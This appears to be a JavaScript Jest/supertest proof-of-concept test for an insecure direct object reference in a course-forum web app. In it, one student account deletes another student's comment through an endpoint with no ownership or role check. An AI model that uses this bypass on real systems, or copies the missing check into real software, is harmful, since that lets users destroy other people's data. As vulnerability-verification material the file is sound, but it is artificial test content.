const supertest = require('supertest');
const {
  startFreshServer,
  stopServer,
  openDb,
  registerAny,
  createCourseAny,
  listUsersAny,
  addMemberAny,
  createPostAny,
  createCommentAny,
  listCommentsAny,
} = require('../../_helpers');

describe('PoC: IDOR - student deletes another student comment', () => {
  let server;

  beforeAll(async () => {
    server = await startFreshServer();
  }, 20000);

  afterAll(async () => {
    await stopServer(server);
  });

  test('bob can delete alice comment because delete endpoint lacks ownership/role check', async () => {
    const teacher = server.agent;
    const alice = supertest.agent(server.baseUrl);
    const bob = supertest.agent(server.baseUrl);

    const uniq = `${Date.now()}_${Math.random().toString(16).slice(2, 8)}`;
    const teacherName = `teacher_comment_${uniq}`;
    const aliceName = `alice_comment_${uniq}`;
    const bobName = `bob_comment_${uniq}`;

    await registerAny(teacher, teacherName, 'pass123', 'Teacher Comment');
    await registerAny(alice, aliceName, 'pass123', 'Alice');
    await registerAny(bob, bobName, 'pass123', 'Bob');

    const db = openDb();
    try {
      const courseRes = await createCourseAny(teacher, 'Course Comment', 'Desc');
      const courseId =
        courseRes.body?.course?.course_id ||
        db.prepare('SELECT course_id FROM courses ORDER BY course_id DESC LIMIT 1').get().course_id;

      const usersRes = await listUsersAny(teacher);
      const users = usersRes.body?.users || db.prepare('SELECT * FROM users').all();

      const aliceUser = users.find((u) => u.username === aliceName);
      const bobUser = users.find((u) => u.username === bobName);

      expect(aliceUser).toBeTruthy();
      expect(bobUser).toBeTruthy();

      await addMemberAny(teacher, courseId, aliceUser.user_id, 'student');
      await addMemberAny(teacher, courseId, bobUser.user_id, 'student');

      const postRes = await createPostAny(alice, courseId, 'Topic', 'Hello');
      const postId =
        postRes.body?.post?.post_id ||
        db.prepare('SELECT post_id FROM posts ORDER BY post_id DESC LIMIT 1').get().post_id;

      const commentRes = await createCommentAny(alice, courseId, postId, 'Alice comment');
      const commentId =
        commentRes.body?.comment?.comment_id ||
        db.prepare('SELECT comment_id FROM comments ORDER BY comment_id DESC LIMIT 1').get().comment_id;

      const delRes = await bob.delete(
        `/api/courses/${courseId}/posts/${postId}/comments/${commentId}`
      );

      expect([200, 302]).toContain(delRes.status);

      const listRes = await listCommentsAny(alice, courseId, postId);
      const comments =
        listRes.body?.comments ||
        db.prepare('SELECT * FROM comments WHERE course_id=? AND post_id=?').all(courseId, postId);

      expect(comments.find((c) => c.comment_id === commentId)).toBeUndefined();
    } finally {
      db.close();
    }
  });
});